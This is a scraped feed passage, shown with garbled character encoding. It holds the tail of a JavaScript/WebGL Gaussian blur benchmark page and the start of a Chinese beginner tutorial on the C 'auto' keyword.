        <span class="hljs-keyword">const</span> posLoc = gl.<span class="hljs-title function_">getAttribLocation</span>(program, <span class="hljs-string">'a_position'</span>);
        <span class="hljs-keyword">const</span> texLoc = gl.<span class="hljs-title function_">getAttribLocation</span>(program, <span class="hljs-string">'a_texCoord'</span>);
        gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">quad</span>.<span class="hljs-property">positionBuffer</span>);
        gl.<span class="hljs-title function_">enableVertexAttribArray</span>(posLoc);
        gl.<span class="hljs-title function_">vertexAttribPointer</span>(posLoc, <span class="hljs-number">2</span>, gl.<span class="hljs-property">FLOAT</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">quad</span>.<span class="hljs-property">texCoordBuffer</span>);
        gl.<span class="hljs-title function_">enableVertexAttribArray</span>(texLoc);
        gl.<span class="hljs-title function_">vertexAttribPointer</span>(texLoc, <span class="hljs-number">2</span>, gl.<span class="hljs-property">FLOAT</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        gl.<span class="hljs-title function_">activeTexture</span>(gl.<span class="hljs-property">TEXTURE0</span>);
        gl.<span class="hljs-title function_">bindTexture</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, texture);
        gl.<span class="hljs-title function_">uniform1i</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_texture'</span>), <span class="hljs-number">0</span>);
        <span class="hljs-keyword">const</span> texelSize = horizontal ? <span class="hljs-number">1.0</span> / w : <span class="hljs-number">1.0</span> / h;
        gl.<span class="hljs-title function_">uniform1f</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_texelSize'</span>), texelSize);
        gl.<span class="hljs-title function_">uniform1i</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_sampleCount'</span>), optimized.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">const</span> offsets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>(<span class="hljs-number">32</span>);
        <span class="hljs-keyword">const</span> weights = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>(<span class="hljs-number">32</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; optimized.<span class="hljs-property">length</span>; i++) {
          offsets[i] = optimized[i].<span class="hljs-property">offset</span>;
          weights[i] = optimized[i].<span class="hljs-property">weight</span>;
        }
        gl.<span class="hljs-title function_">uniform1fv</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_offsets'</span>), offsets);
        gl.<span class="hljs-title function_">uniform1fv</span>(gl.<span class="hljs-title function_">getUniformLocation</span>(program, <span class="hljs-string">'u_weights'</span>), weights);
        gl.<span class="hljs-title function_">drawArrays</span>(gl.<span class="hljs-property">TRIANGLES</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);
      }
    }

    <span class="hljs-comment">// ==================== UI é€»è¾‘ ====================</span>

    <span class="hljs-keyword">let</span> currentImage = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> webglTradBlur = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> webglOptBlur = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'sigmaRange'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'sigmaValue'</span>).<span class="hljs-property">textContent</span> = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
    });

    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'radiusRange'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'radiusValue'</span>).<span class="hljs-property">textContent</span> = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
    });

    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'imageUpload'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> file = e.<span class="hljs-property">target</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
      <span class="hljs-keyword">if</span> (!file) <span class="hljs-keyword">return</span>;
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>();
      reader.<span class="hljs-property">onload</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
        img.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> {
          currentImage = img;
          <span class="hljs-title function_">displayOriginalImage</span>(img);
          <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'applyButton'</span>).<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;
        };
        img.<span class="hljs-property">src</span> = event.<span class="hljs-property">target</span>.<span class="hljs-property">result</span>;
      };
      reader.<span class="hljs-title function_">readAsDataURL</span>(file);
    });

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">displayOriginalImage</span>(<span class="hljs-params">img</span>) {
      <span class="hljs-keyword">const</span> maxSize = <span class="hljs-number">300</span>;
      <span class="hljs-keyword">let</span> w = img.<span class="hljs-property">width</span>;
      <span class="hljs-keyword">let</span> h = img.<span class="hljs-property">height</span>;
      <span class="hljs-keyword">if</span> (w &gt; maxSize || h &gt; maxSize) {
        <span class="hljs-keyword">const</span> ratio = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(maxSize / w, maxSize / h);
        w = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(w * ratio);
        h = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(h * ratio);
      }

      <span class="hljs-keyword">const</span> canvases = [
        <span class="hljs-string">'originalCanvas'</span>, <span class="hljs-string">'canvas2dTraditional'</span>, <span class="hljs-string">'canvas2dOptimized'</span>,
        <span class="hljs-string">'webglTraditional'</span>, <span class="hljs-string">'webglOptimized'</span>
      ];
      canvases.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(id);
        c.<span class="hljs-property">width</span> = w;
        c.<span class="hljs-property">height</span> = h;
      });

      <span class="hljs-keyword">const</span> ctx = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'originalCanvas'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
      ctx.<span class="hljs-title function_">drawImage</span>(img, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h);

      webglTradBlur = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebGLBlur</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglTraditional'</span>));
      webglOptBlur = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebGLBlur</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglOptimized'</span>));
    }

    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'applyButton'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (!currentImage) <span class="hljs-keyword">return</span>;
      <span class="hljs-keyword">const</span> sigma = <span class="hljs-built_in">parseFloat</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'sigmaRange'</span>).<span class="hljs-property">value</span>);
      <span class="hljs-keyword">const</span> radius = <span class="hljs-built_in">parseInt</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'radiusRange'</span>).<span class="hljs-property">value</span>);
      <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'applyButton'</span>);
      btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;
      btn.<span class="hljs-property">textContent</span> = <span class="hljs-string">'å¤„ç†ä¸­...'</span>;
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">processBlur</span>(sigma, radius);
        btn.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;
        btn.<span class="hljs-property">textContent</span> = <span class="hljs-string">'åº”ç”¨æ¨¡ç³Š'</span>;
      }, <span class="hljs-number">10</span>);
    });

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">processBlur</span>(<span class="hljs-params">sigma, radius</span>) {
      <span class="hljs-keyword">const</span> originalCanvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'originalCanvas'</span>);
      <span class="hljs-keyword">const</span> w = originalCanvas.<span class="hljs-property">width</span>;
      <span class="hljs-keyword">const</span> h = originalCanvas.<span class="hljs-property">height</span>;
      <span class="hljs-keyword">const</span> ctx = originalCanvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
      <span class="hljs-keyword">const</span> imageData = ctx.<span class="hljs-title function_">getImageData</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h);
      <span class="hljs-keyword">const</span> kernel = <span class="hljs-title function_">generateGaussianKernel</span>(radius, sigma);
      <span class="hljs-keyword">const</span> optimized = <span class="hljs-title function_">optimizeKernel</span>(kernel);

      <span class="hljs-comment">// Canvas 2D ä¼ ç»Ÿ</span>
      <span class="hljs-keyword">const</span> t1 = performance.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">const</span> temp1 = <span class="hljs-title function_">blurHorizontal</span>(imageData, kernel, radius);
      <span class="hljs-keyword">const</span> result1 = <span class="hljs-title function_">blurVertical</span>(temp1, kernel, radius);
      <span class="hljs-keyword">const</span> t2 = performance.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">const</span> ctx1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'canvas2dTraditional'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
      ctx1.<span class="hljs-title function_">putImageData</span>(result1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);

      <span class="hljs-comment">// Canvas 2D ä¼˜åŒ–</span>
      <span class="hljs-keyword">const</span> t3 = performance.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">const</span> temp2 = <span class="hljs-title function_">blurHorizontalOptimized</span>(imageData, optimized);
      <span class="hljs-keyword">const</span> result2 = <span class="hljs-title function_">blurVerticalOptimized</span>(temp2, optimized);
      <span class="hljs-keyword">const</span> t4 = performance.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">const</span> ctx2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'canvas2dOptimized'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
      ctx2.<span class="hljs-title function_">putImageData</span>(result2, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);

      <span class="hljs-comment">// WebGL ä¼ ç»Ÿ</span>
      <span class="hljs-keyword">const</span> tradTexture = <span class="hljs-title function_">loadTexture</span>(webglTradBlur.<span class="hljs-property">gl</span>, originalCanvas);
      <span class="hljs-keyword">const</span> t5 = performance.<span class="hljs-title function_">now</span>();
      webglTradBlur.<span class="hljs-title function_">applyTraditional</span>(tradTexture, w, h, radius, sigma);
      webglTradBlur.<span class="hljs-property">gl</span>.<span class="hljs-title function_">finish</span>();
      <span class="hljs-keyword">const</span> t6 = performance.<span class="hljs-title function_">now</span>();
      webglTradBlur.<span class="hljs-property">gl</span>.<span class="hljs-title function_">deleteTexture</span>(tradTexture);

      <span class="hljs-comment">// WebGL ä¼˜åŒ–</span>
      <span class="hljs-keyword">const</span> optTexture = <span class="hljs-title function_">loadTexture</span>(webglOptBlur.<span class="hljs-property">gl</span>, originalCanvas);
      <span class="hljs-keyword">const</span> t7 = performance.<span class="hljs-title function_">now</span>();
      webglOptBlur.<span class="hljs-title function_">applyOptimized</span>(optTexture, w, h, radius, sigma);
      webglOptBlur.<span class="hljs-property">gl</span>.<span class="hljs-title function_">finish</span>();
      <span class="hljs-keyword">const</span> t8 = performance.<span class="hljs-title function_">now</span>();
      webglOptBlur.<span class="hljs-property">gl</span>.<span class="hljs-title function_">deleteTexture</span>(optTexture);

      <span class="hljs-comment">// ç»Ÿè®¡ä¿¡æ¯</span>
      <span class="hljs-keyword">const</span> kernelSize = <span class="hljs-number">2</span> * radius + <span class="hljs-number">1</span>;
      <span class="hljs-keyword">const</span> tradSamples = kernelSize * <span class="hljs-number">2</span>;
      <span class="hljs-keyword">const</span> optSamples = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(kernelSize / <span class="hljs-number">2</span>) * <span class="hljs-number">2</span>;

      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'c2dTradSamples'</span>).<span class="hljs-property">textContent</span> = tradSamples;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'c2dTradTime'</span>).<span class="hljs-property">textContent</span> = (t2 - t1).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">' ms'</span>;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'c2dOptSamples'</span>).<span class="hljs-property">textContent</span> = optSamples;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'c2dOptTime'</span>).<span class="hljs-property">textContent</span> = (t4 - t3).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">' ms'</span>;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'c2dSpeedup'</span>).<span class="hljs-property">textContent</span> = ((t2 - t1) / (t4 - t3)).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">'x'</span>;

      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglTradSamples'</span>).<span class="hljs-property">textContent</span> = tradSamples;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglTradTime'</span>).<span class="hljs-property">textContent</span> = (t6 - t5).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">' ms'</span>;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglOptSamples'</span>).<span class="hljs-property">textContent</span> = optSamples;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglOptTime'</span>).<span class="hljs-property">textContent</span> = (t8 - t7).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">' ms'</span>;
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'webglSpeedup'</span>).<span class="hljs-property">textContent</span> = ((t6 - t5) / (t8 - t7)).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">'x'</span>;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Cè¯­è¨€å…¥é—¨ã€‘è§£é”æ ¸å¿ƒå…³é”®å­—çš„ç»ˆæå¥¥ç§˜ä¸å®æˆ˜åº”ç”¨ï¼ˆä¸‰ï¼‰]]></title>    <link>https://juejin.cn/post/7589903499599773750</link>    <guid>https://juejin.cn/post/7589903499599773750</guid>    <pubDate>2026-01-01T15:09:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599773750" data-draft-id="7589838742552739859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Cè¯­è¨€å…¥é—¨ã€‘è§£é”æ ¸å¿ƒå…³é”®å­—çš„ç»ˆæå¥¥ç§˜ä¸å®æˆ˜åº”ç”¨ï¼ˆä¸‰ï¼‰"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-01T15:09:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="byteè½»éª‘å…µ"/> <meta itemprop="url" content="https://juejin.cn/user/3995005743010080"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Cè¯­è¨€å…¥é—¨ã€‘è§£é”æ ¸å¿ƒå…³é”®å­—çš„ç»ˆæå¥¥ç§˜ä¸å®æˆ˜åº”ç”¨ï¼ˆä¸‰ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3995005743010080/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    byteè½»éª‘å…µ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:09:15.000Z" title="Thu Jan 01 2026 15:09:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€auto</h2>
<p>åœ¨Cè¯­è¨€ä¸­ï¼Œ<code>auto</code> å…³é”®å­—ç”¨äºä¿®é¥°å±€éƒ¨å˜é‡ï¼Œå°½ç®¡åœ¨å®é™…ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€çœç•¥è¿™ä¸ªå…³é”®å­—ï¼Œå› ä¸ºå±€éƒ¨å˜é‡é»˜è®¤å°±æ˜¯è‡ªåŠ¨å­˜å‚¨ç±»å‹ï¼ˆ<code>auto</code>ï¼‰çš„ã€‚<code>auto</code> å…³é”®å­—çš„ä¸»è¦ä½œç”¨æ˜¯æ˜¾å¼åœ°è¡¨æ˜å˜é‡çš„å­˜å‚¨ç±»å‹ï¼Œå¹¶å¸®åŠ©ç¨‹åºå‘˜æ›´å¥½åœ°ç†è§£ä»£ç ã€‚</p>
<h3 data-id="heading-1">1.1. ä½œç”¨</h3>
<ul>
<li>
<p>ä¿®é¥°å±€éƒ¨å˜é‡ï¼Œè¡¨æ˜è¯¥å˜é‡æ˜¯è‡ªåŠ¨å­˜å‚¨ç±»å‹çš„ã€‚</p>
</li>
<li>
<p>è™½ç„¶é€šå¸¸çœç•¥ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ˜¾å¼ä½¿ç”¨ <code>auto</code> å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚</p>
</li>
</ul>
<h3 data-id="heading-2">1.2. ç‰¹æ€§</h3>
<ul>
<li>
<p><strong>è‡ªåŠ¨åˆ†é…å†…å­˜</strong>ï¼šå½“å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œ<code>auto</code> å˜é‡ä¼šåœ¨æ ˆä¸Šè‡ªåŠ¨åˆ†é…å†…å­˜ã€‚</p>
</li>
<li>
<p><strong>è‡ªåŠ¨é‡Šæ”¾å†…å­˜</strong>ï¼šå½“å‡½æ•°è¿”å›æ—¶ï¼Œ<code>auto</code> å˜é‡æ‰€å ç”¨çš„å†…å­˜ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œå˜é‡å¤±æ•ˆã€‚</p>
</li>
<li>
<p><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼š<code>auto</code> å˜é‡çš„ç”Ÿå‘½å‘¨æœŸä»…é™äºå®šä¹‰å®ƒçš„å‡½æ•°æˆ–ä»£ç å—å†…ã€‚</p>
</li>
</ul>
<h3 data-id="heading-3">1.3. ä»£ç ç¤ºä¾‹</h3>
<p>è™½ç„¶<code>auto</code>å…³é”®å­—é€šå¸¸è¢«çœç•¥ï¼Œä½†ä»¥ä¸‹ç¤ºä¾‹å¯ä»¥å±•ç¤ºå…¶ç”¨æ³•ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
  
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">myFunction</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-keyword">auto</span> <span class="hljs-type">int</span> myAutoVar = <span class="hljs-number">10</span>; <span class="hljs-comment">// æ˜¾å¼ä½¿ç”¨ auto å…³é”®å­—ï¼Œä½†é€šå¸¸å¯ä»¥çœç•¥  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Value of myAutoVar: %d\n"</span>, myAutoVar);  
    <span class="hljs-comment">// myAutoVar åœ¨è¿™é‡Œæœ‰æ•ˆï¼Œä½†å‡½æ•°è¿”å›åå°†è‡ªåŠ¨é‡Šæ”¾å†…å­˜  </span>
}  
  
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{  
    <span class="hljs-built_in">myFunction</span>();  
    <span class="hljs-comment">// printf("Value of myAutoVar: %d\n", myAutoVar); // é”™è¯¯ï¼šmyAutoVar åœ¨è¿™é‡Œæ— æ•ˆ  </span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
